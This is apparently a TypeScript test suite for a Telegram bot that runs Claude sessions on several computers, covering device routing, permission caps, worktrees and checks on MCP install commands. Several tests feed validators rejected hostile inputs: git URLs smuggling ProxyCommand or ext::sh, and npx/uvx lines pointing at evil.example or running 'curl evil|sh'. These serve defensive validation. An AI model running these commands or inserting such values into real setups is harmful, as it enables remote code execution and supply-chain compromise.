import { test } from 'node:test'
import assert from 'node:assert/strict'
import { CLOUD_DEVICE_ID } from '@tgcv/protocol'
import { mcpInstallProblem } from '@tgcv/protocol'
import { answerTarget, canTalkOffline, cloneableRemote, computerNameProblem, deferredPrompt, findComputer, groupProjects, modeCapOf, onlyRootChanged, otherComputers, senderCap, stricterMode, taskList, topicMessagePrompt, worktreePath } from '../src/telegram/computers.ts'
import { createComputerServer, SUGGEST_COMPUTER, COMPUTER_SERVER, COPY_TO_COMPUTER, TOPIC_SERVER, TOPIC_NAME_SERVER, DELETE_SERVER, MESSAGE_SERVER, SURVEY_SERVER, DEFER_SERVER } from '../src/claude/topic-tools.ts'
import { DEVICE_SERVER } from '../src/claude/device-tools.ts'
import { TEAM_SERVER } from '../src/claude/team-tools.ts'
import { SCHEDULE_SERVER } from '../src/claude/schedule-tools.ts'
import { BROWSER_ASK_SERVER, BROWSER_OPEN_SERVER } from '../src/claude/browser-tools.ts'
import { DECISION_SERVER } from '../src/claude/decision-tools.ts'
import { CHROME_SERVER } from '../src/claude/chrome.ts'
import { toolStep } from '../src/telegram/render.ts'

const devices = [{ id: 'pc', name: 'PC' }, { id: 'mac', name: 'MacBook-Pro-Scott' }, { id: CLOUD_DEVICE_ID, name: 'Cloud' }]

test('a topic can go to any other computer, the cloud among them, but not where it already is', () => {
  assert.deepEqual(otherComputers(devices, 'pc').map(d => d.id), ['mac', CLOUD_DEVICE_ID])
  assert.deepEqual(otherComputers(devices).map(d => d.id), ['pc', 'mac', CLOUD_DEVICE_ID])
  assert.deepEqual(otherComputers(devices, CLOUD_DEVICE_ID).map(d => d.id), ['pc', 'mac'])
  assert.deepEqual(otherComputers(devices, 'pc', { cloud: false }).map(d => d.id), ['mac'], 'files are copied between computers only')
  // Its id must fit in a button
  assert.deepEqual(otherComputers([{ id: 'x'.repeat(64) }]), [])
})

test('Claude can name a computer by its name or id, in any case', () => {
  assert.equal(findComputer(devices, 'macbook-pro-scott')?.id, 'mac')
  assert.equal(findComputer(devices, ' PC ')?.id, 'pc')
  assert.equal(findComputer(devices, 'Mac Mini'), undefined)
})

test('only a clean address is cloned from: a token in it stays on its computer', () => {
  assert.equal(cloneableRemote('https://github.com/a/b.git\n'), 'https://github.com/a/b.git')
  assert.equal(cloneableRemote('git@github.com:a/b.git'), 'git@github.com:a/b.git')
  assert.equal(cloneableRemote('ssh://git@host/a.git'), 'ssh://git@host/a.git')
  assert.equal(cloneableRemote('https://user:secret@github.com/a/b.git'), null)
  assert.equal(cloneableRemote('https://token@github.com/a/b.git'), null)
  // Nothing git could take for an option or a local path
  assert.equal(cloneableRemote('--upload-pack=x'), null)
  assert.equal(cloneableRemote('ext::sh -c touch%20x'), null)
  assert.equal(cloneableRemote('git@-oProxyCommand=x:a/b'), null)
  assert.equal(cloneableRemote('ssh://-oProxyCommand=x/a'), null)
  assert.equal(cloneableRemote('../other'), null)
  assert.equal(cloneableRemote(''), null)
})

test('a computer name is plain, and tells it apart from the others', () => {
  const others = [{ id: 'pc', name: 'Рабочий' }]
  for (const good of ['Mac', 'Mac Mini', 'Мак 2', "Scott's.Mac_1-a"]) assert.equal(computerNameProblem(good, others), null, good)
  for (const bad of ['', ' x', '<b>', 'a*b', '[a](b)', 'a\nb', '-x', 'x'.repeat(41)]) assert.equal(computerNameProblem(bad, others), 'bad', bad)
  assert.equal(computerNameProblem('рабочий', others), 'taken')
  assert.equal(computerNameProblem('PC', others), 'taken', 'nor the id of another')
})

test('a message from another topic can get no more done than its sender could', () => {
  assert.equal(stricterMode('all', 'ask'), 'ask')
  assert.equal(stricterMode('ask', 'all'), 'ask')
  assert.equal(stricterMode('all', 'all'), 'all')
  assert.equal(stricterMode('read', 'all'), 'read')
  assert.equal(stricterMode('edits', 'ask'), 'ask')
  assert.equal(stricterMode('all', 'edits'), 'edits')
  // From the cloud it never reaches a real computer on its own, whatever the mode there
  assert.equal(senderCap('all', true, false), 'ask')
  assert.equal(senderCap('read', true, false), 'read')
  assert.equal(senderCap('all', true, true), 'all')
  assert.equal(senderCap('all', false, false), 'all')
  // A turn answering several takes the strictest; a turn for the user alone has no cap
  assert.equal(modeCapOf([{ fromMode: 'all' }, {}, { fromMode: 'ask' }]), 'ask')
  assert.equal(modeCapOf([{}, {}]), undefined)
  // And it says who is speaking
  const p = topicMessagePrompt('tg-claude', 'привет')
  assert.match(p, /not from the user/)
  assert.match(p, /message_topic to «tg-claude»/)
  assert.ok(p.endsWith('привет'))
})

test('the picker shows a repository once, where its newest folder stands', () => {
  const groups = groupProjects([
    { id: 'wt-new', worktreeOf: 'repo' },
    { id: 'plain' },
    { id: 'repo' },
    { id: 'wt-old', worktreeOf: 'repo' },
    { id: 'lost', worktreeOf: 'gone' },
  ])
  assert.deepEqual(groups.map(g => g.root.id), ['repo', 'plain', 'lost'])
  assert.deepEqual(groups[0].worktrees.map(p => p.id), ['wt-new', 'wt-old'])
  assert.deepEqual(groups[1].worktrees, [])
})

test('with the computer away, Claude talks only to someone who wrote', () => {
  assert.equal(canTalkOffline({}, [{ msgId: 1 }]), true)
  assert.equal(canTalkOffline({}, [{ shownId: 1 }, { msgId: 2 }]), true, 'a report from an agent elsewhere, and what was written after it')
  assert.equal(canTalkOffline({ head: 'k' }, [{ msgId: 1 }]), false, 'an agent waits')
  assert.equal(canTalkOffline({}, [{ msgId: 1, scheduleId: 's' }]), false, 'a scheduled run waits')
  assert.equal(canTalkOffline({}, [{}]), false, 'a task from the bot itself waits')
  assert.equal(canTalkOffline({}, []), false)
  assert.equal(canTalkOffline({}, [{ msgId: 1 }, {}]), false)
})

test('the tasks come back numbered, with a warning that things have moved on', () => {
  const p = deferredPrompt('PC', ['a', 'b'])
  assert.match(p, /PC is online again/)
  assert.match(p, /1\. a\n2\. b/)
  assert.match(p, /read before relying/)
})

test('the archive changing its own folder is no reason to fail, a file changing is', () => {
  assert.equal(onlyRootChanged('tar: .: file changed as we read it\n'), true)
  assert.equal(onlyRootChanged('/usr/bin/tar: ./: file changed as we read it'), true)
  assert.equal(onlyRootChanged('tar: ./src/a.ts: file changed as we read it'), false)
  assert.equal(onlyRootChanged('tar: .: file changed as we read it\ntar: ./b: file changed as we read it'), false)
  assert.equal(onlyRootChanged(''), false)
})

test('Claude offers another computer with a tool of the bot, and the tool names who is online', () => {
  assert.equal(SUGGEST_COMPUTER, `mcp__${COMPUTER_SERVER}__suggest_computer`)
  assert.equal(COPY_TO_COMPUTER, `mcp__${COMPUTER_SERVER}__copy_files`)
  assert.equal(toolStep(COPY_TO_COMPUTER, { path: 'assets', computer: 'Mac', direction: 'send' }), '📦 `assets` → Mac')
  assert.equal(toolStep(COPY_TO_COMPUTER, { path: 'out.mp4', computer: 'Mac', direction: 'fetch' }), '📦 `out.mp4` ← Mac')
  assert.equal(createComputerServer(['MacBook'], async () => '', async () => '').name, COMPUTER_SERVER)
})

test('a new worktree goes where its repository keeps them', () => {
  const p = (name: string, path: string, more = {}) => ({ id: name, name, path, ...more })
  const repo = p('rbx-farm-game', 'C:\\code\\rbx-farm-game')
  const inFolder = p('old', 'C:\\code\\mfm-wt\\old', { worktreeOf: repo.id })
  const folder = p('mfm-wt', 'C:\\code\\mfm-wt', { hidden: true })
  assert.equal(worktreePath(repo, [repo, inFolder, folder], 'x'), 'C:/code/mfm-wt/x', 'the folder its worktrees are in')
  assert.equal(worktreePath(inFolder, [repo, inFolder, folder], 'x'), 'C:/code/mfm-wt/x', 'also from a worktree of it')

  const core = p('acme-core', 'C:\\code\\acme-core')
  const empty = p('acme-wt', 'C:\\code\\acme-wt', { hidden: true })
  assert.equal(worktreePath(core, [core, empty, folder], 'x'), 'C:/code/acme-wt/x', 'a folder named after it')

  const beside = p('rig', '/Users/s/code/rig')
  const loose = p('rig-old', '/Users/s/code/rig-old', { worktreeOf: 'rig' })
  const other = p('rigging-wt', '/Users/s/code/rigging-wt', { hidden: true })
  assert.equal(worktreePath(beside, [beside, loose, other], 'x'), '/Users/s/code/rig-wt/x', 'otherwise a new one: loose worktrees and another project\'s folder do not count')
})

test('what an update waits for: topics under their workspace, and a long list stays short', () => {
  assert.deepEqual(taskList([{ topic: 'Head', place: 'Farm' }, { topic: 'tg-claude', place: 'личный чат' }, { topic: 'Rebirth', place: 'Farm' }]), [
    '<b>Farm</b>\n• Head\n• Rebirth',
    '<b>личный чат</b>\n• tg-claude',
  ])
  assert.deepEqual(taskList(Array.from({ length: 5 }, (_, i) => ({ topic: `t${i}`, place: 'p' })), 3), ['<b>p</b>\n• t0\n• t1\n• t2', '… +2'])
})

test('a package needs an exact version; another program is shown to the user as it is', () => {
  const problem = (command: string, ...args: string[]) => mcpInstallProblem({ name: 'x', command, args })
  for (const ok of [['npx', '-y', 'xcodebuildmcp@2.7.0', 'mcp'], ['npx', '-p', '@scope/pkg@1.2.3', 'run'], ['npx', '--package=@scope/pkg@1.2.3-beta.1', 'run'], ['uvx', 'blender-mcp==2.0.0'], ['uvx', '--from', 'some_mcp[extra]==1.2', 'tool'], ['pipx', 'run', '--spec', 'a==1.2.3', 'tool'], ['pnpm', 'dlx', 'a@1.2.3'], ['npx.cmd', '-y', 'a@1.2.3'], ['npm', 'exec', '--', 'a@1.2.3'], ['node', 'server.js'], ['/usr/bin/some-mcp']]) {
    assert.equal(problem(ok[0], ...ok.slice(1)), null, ok.join(' '))
  }
  for (const bad of [['npx', '-y', 'a'], ['npx', '-y', 'a@latest'], ['npx', '@scope/pkg'], ['C:\\node\\npx.cmd', 'a@next'], ['uvx', 'blender-mcp'], ['pnpm', 'dlx', 'a'], ['npm', 'exec', 'a'], ['npx']]) {
    assert.match(problem(bad[0], ...bad.slice(1))!, /exact version/, bad.join(' '))
  }
  assert.match(mcpInstallProblem({ name: 'device', command: 'x' })!, /taken/)
})

test('an exact version can\'t be got around: a range, an address, or the package named some other way', () => {
  const problem = (command: string, ...args: string[]) => mcpInstallProblem({ name: 'x', command, args })
  for (const bad of [
    ['npx', 'a@1'], ['npx', 'a@1.x'], ['npx', 'a@1.2'], ['npx', 'a@^1.2.3'], ['uvx', 'a==1.*'],
    ['npx', 'https://evil.example/x.tgz@1.2.3'], ['npx', 'git+https://evil.example/x@1.2.3'],
    // The package that runs is the first of these, whatever comes after it
    ['npx', '-y', '--package=evil', 'a@1.2.3'], ['npx', '-p=evil', 'a@1.2.3'], ['uvx', '--from=evil', 'a==1.2.3'], ['npx', '-p', 'a@1.2.3', '-p', 'evil', 'run'], ['pipx', 'run', '--spec=evil', 'a==1.2.3'],
  ]) assert.match(problem(bad[0], ...bad.slice(1))!, /exact version/, bad.join(' '))
  for (const bad of [
    ['npx', '--registry=https://evil.example', 'a@1.2.3'], ['npx', '--registry', 'https://evil.example', 'a@1.2.3'], ['npx', '-c', 'a@1.2.3 && curl evil|sh'], ['npx', '--call=sh', 'a@1.2.3'],
    ['uvx', '--index-url=https://evil.example', 'a==1.2.3'], ['uvx', '--with', 'evil', 'a==1.2.3'], ['uvx', '--extra-index-url', 'https://evil.example', 'a==1.2.3'],
  ]) assert.match(problem(bad[0], ...bad.slice(1))!, /not taken/, bad.join(' '))
})

test('a program on a computer can\'t take the name of one of the bot\'s own tool servers', () => {
  for (const name of [DEVICE_SERVER, TOPIC_SERVER, TOPIC_NAME_SERVER, DELETE_SERVER, MESSAGE_SERVER, SURVEY_SERVER, DEFER_SERVER, COMPUTER_SERVER, TEAM_SERVER, SCHEDULE_SERVER, BROWSER_ASK_SERVER, BROWSER_OPEN_SERVER, DECISION_SERVER, CHROME_SERVER]) {
    assert.match(mcpInstallProblem({ name, command: 'node', args: ['server.js'] })!, /taken/, name)
  }
  assert.equal(mcpInstallProblem({ name: 'blender', command: 'node', args: ['server.js'] }), null)
})

test('an answer replies to the last thing it answers: a voice message through its transcript', () => {
  assert.equal(answerTarget([{ msgId: 1 }]), 1)
  assert.equal(answerTarget([{ msgId: 1 }, { msgId: 2, shownId: 3 }]), 3, 'the transcript, not the voice message')
  assert.equal(answerTarget([{ msgId: 2, shownId: 3 }, { msgId: 4 }]), 4)
  assert.equal(answerTarget([{ shownId: 5 }]), 5, 'a report')
  assert.equal(answerTarget([{}]), undefined, 'a scheduled run has nothing to reply to')
})
